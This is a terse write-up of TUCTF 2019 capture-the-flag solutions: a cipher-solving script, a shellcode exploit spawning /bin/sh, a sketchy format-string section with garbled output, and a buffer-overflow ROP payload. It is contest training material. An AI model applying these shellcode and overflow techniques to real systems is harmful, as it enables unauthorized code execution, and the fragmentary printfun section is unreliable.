# TUCTF 2019 

![image](https://user-images.githubusercontent.com/25066959/70835878-744da180-1dcc-11ea-9016-c3a200a13f30.png)

This is a shitty writup I did this days after and the TUCTF site was down so no points and I didnt write down the flags... So solutions only with no real explenation... Im just trying to get more of these out there and I really let the ball drop this time.    


Title                         | Category     
----------------------------- | ------------
Crypto Infinit		      | Crypto	     
3step					  | Pwn   
printfun				  | Pwn 
pancakes				  | Pwn

# Crypto Infinit (crypto)    

```python 
#!/usr/bin/env python2
​
from pwn import *
import string
​
p = remote("chal.tuctf.com", 30102)
​
# Level 0 - 4
for i_ in range(5):
​
    p.sendlineafter("Give me text:", string.ascii_uppercase[::-1])
    p.recvuntil("encrypted is ")
    mapping = dict(zip(p.recvline().strip().split(" "), string.ascii_uppercase[::-1]))
​
    for i in range(50):
        p.recvuntil("Decrypt ")
        encrypted = p.recvline().strip().split(" ")
​
        answer = ""
        for k in encrypted:
            answer += mapping[k]
​
        p.sendline(answer)
​
​
# Level 5
plaintext = ''.join([c * 8 for c in string.ascii_uppercase])
p.sendlineafter("Give me text:", plaintext)
p.recvuntil("encrypted is ")
​
mapping = {}
enc = p.recvline().strip().split(" ")
for i in range(len(enc)):
    mapping[i % 8] = mapping.get(i % 8, {})
    mapping[i % 8][enc[i]] = plaintext[i]
​
print mapping
for i in range(50):
    p.recvuntil("Decrypt ")
    encrypted = p.recvline().strip().split(" ")
​
    answer = ""
    for i, k in enumerate(encrypted):
        answer += mapping[i % 8][k]
​
    p.sendline(answer)
​
# for i_ in range(5):
​
#     p.sendlineafter("Give me text:", string.ascii_uppercase[::-1])
#     p.recvuntil("encrypted is ")
#     mapping = dict(zip(p.recvline().strip().split(" "), string.ascii_uppercase[::-1]))
​
#     for i in range(50):
#         p.recvuntil("Decrypt ")
#         encrypted = p.recvline().strip().split(" ")
​
#         answer = ""
#         for k in encrypted:
#             answer += mapping[k]
​
#         p.sendline(answer)
​
p.sendlineafter("Give me text:", "ABAB")
p.interactive()
```     

# 3step (pwn)    

```python
#!/usr/bin/python
from pwn import *
import sys
#context.log_level = "debug"
#p = process("./3step")
p = process("nc chal.tuctf.com 30504".split(" "))
raw_input("waiting... ")
p.readline()
p.readline()
heap = int(p.readline(), 16)
stack = int(p.readline(), 16)
print "heap = {}".format(hex(heap))
print "stack = {}".format(hex(stack))

code = """
xor eax, eax
mov ebx, {}
xor ecx, ecx
xor edx, edx
mov al, 0x0b
int 0x80""".format(stack)
shellcode = asm(code)
print len(shellcode)
binsh = "/bin/sh\x00"
heap = p32(heap)
tot = ""

tot += shellcode + (0x12 - len(shellcode)) * 'a'
tot += binsh + (0x10 - len(binsh)) * 'a'
tot += heap
p.recv()
p.send(tot)
#p.send(shellcode)
#p.send("/bin/sh\x00")
#p.send(p32(heap))
p.interactive()


p.kill()
```

# printfun (pwn)
this challenge was a format sring vulnerability 

```python
#!/usr/bin/python
# ebp - 0xc
# ebp - 0x10
```    
output:
```
# 6
4
%6$s
# 7
60
\x95\xa4\x14F\xfe\xfe��M\x96UF\x11Ǧ\x89�#\x18X\xb7\x87\x84$\xbb�
                                                                \xaaƓ\x1c@\x17?�U\x04i
\x07�Ub)\x0b\xb7\xb6\x03y\xbe\xac\x1d7\x7f\x97\xfe
```    
exploit:   
```python
#include <stdio.h>
#include <stdlib.h>

int main()
{
  int n;
  scanf("%d", &n);
  srand(n);
  printf("%d\n", rand());
  return 0;
}
```    

# Pancakes (Pwn)
I remember being given the password it was password the payload is this:   
```python
#!/usr/bin/python
from pwn import *
payload = 'a' * (0x30-4)
payload += p32(0x8049060) # puts
payload += p32(0x80492cd) # pwnme
payload += p32(0x804c060) # flag
print payload
```    
